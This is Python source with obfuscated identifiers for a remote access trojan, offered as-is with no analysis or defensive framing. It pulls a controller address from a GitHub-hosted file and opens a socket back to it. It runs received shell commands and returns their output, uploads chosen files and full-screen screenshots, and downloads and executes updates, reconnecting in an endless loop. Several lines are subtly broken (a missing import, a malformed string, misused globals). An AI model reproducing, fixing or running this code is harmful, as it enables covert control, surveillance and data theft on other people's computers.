import sys,subprocess,socket,time,requests
from PIL import ImageGrab
oacEotRgISLonsVINldtTu = "1.29.11.24"
PyvfVgXPrGzn = ""
nJopHKDbNpHEwLmWfcdDfDC = ""
cQoPeeekDCjBLP = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
faMClIwDIehdBb = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
oKZOPthLboFTC = "!"

def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def KEZeyHEKcMQojMzxOO(s):
	shJmXKUCwNhoLNJ = s.recv(1024)
	if len(shJmXKUCwNhoLNJ)==0:
		return True
	lWXgMoVJmfCLVsstCJUuRQN = shJmXKUCwNhoLNJ.decode("utf-8")
	if not lWXgMoVJmfCLVsstCJUuRQN.startswith(oKZOPthLboFTC):
		proc = subprocess.run(shJmXKUCwNhoLNJ.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	qVgSeirnpVtqRbh = lWXgMoVJmfCLVsstCJUuRQN.split(" ")[0][1:]
	if qVgSeirnpVtqRbh == "download":
		pHpMYLkzXXrft(s, lWXgMoVJmfCLVsstCJUuRQN)
	elif qVgSeirnpVtqRbh == "screenshot":
		UTQEdHM(s)

def pHpMYLkzXXrft(s, lWXgMoVJmfCLVsstCJUuRQN):
	TUiROMFzPB = lWXgMoVJmfCLVsstCJUuRQN.replace(oKZOPthLboFTC+"screenshot ", "").split(",")
	results = []
	for f in TUiROMFzPB:
		results += FmQmuHD(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))

def UTQEdHM(lWXgMoVJmfCLVsstCJUuRQN):
	HrETcupHFqzj = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	HrETcupHFqzj.save(fpath)
	HrETcupHFqzj.close()
	r = FmQmuHD(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)

def FmQmuHD(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(PyvfVgXPrGzn+":"+nJopHKDbNpHEwLmWfcdDfDC+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"

def qNFcbLjSTSje():
	if PyvfVgXPrGzn == "" or nJopHKDbNpHEwLmWfcdDfDC == "":
		shJmXKUCwNhoLNJ = requests.get(cQoPeeekDCjBLP).text.replace("\n","").split(":")
		PyvfVgXPrGzn = shJmXKUCwNhoLNJ[0].strip()
		nJopHKDbNpHEwLmWfcdDfDC = shJmXKUCwNhoLNJ[1].strip()
		pvelqNbTpQWURV = shJmXKUCwNhoLNJ[2].strip()
	return PyvfVgXPrGzn, nJopHKDbNpHEwLmWfcdDfDC, pvelqNbTpQWURV

def OMuRshzUSG():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+oacEotRgISLonsVINldtTu + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(faMClIwDIehdBb+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")

def WuIksXHSKjHHJ():
	pass

def ZxwQXCfyZDurNGyKJgV():
	h, p, v = qNFcbLjSTSje()
	if oacEotRgISLonsVINldtTu != v:
		OMuRshzUSG()
	WuIksXHSKjHHJ()
	while True:
		try:
			while True:
				SIOdCDYDDlCwwuJoXuT=False
				try:
					s=connect(h, p)
					while not SIOdCDYDDlCwwuJoXuT:
						s.send(b"\n>> ")
						SIOdCDYDDlCwwuJoXuT=KEZeyHEKcMQojMzxOO(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(ZxwQXCfyZDurNGyKJgV())
